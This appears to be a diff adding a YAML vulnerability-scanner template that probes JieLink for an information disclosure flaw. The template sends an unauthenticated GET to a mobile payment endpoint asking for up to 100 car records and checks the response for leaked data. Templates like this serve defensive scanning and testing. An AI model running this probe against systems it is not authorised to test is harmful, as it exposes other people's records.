@@ -1,0 +1,14 @@
+name: poc-yaml-JieLink-Information-disclosure
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /mobile/pay/GetCars?pageIndex=1&pageSize=100
+    expression: response.status == 200 && response.body.bcontains(b'columns')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/138962894
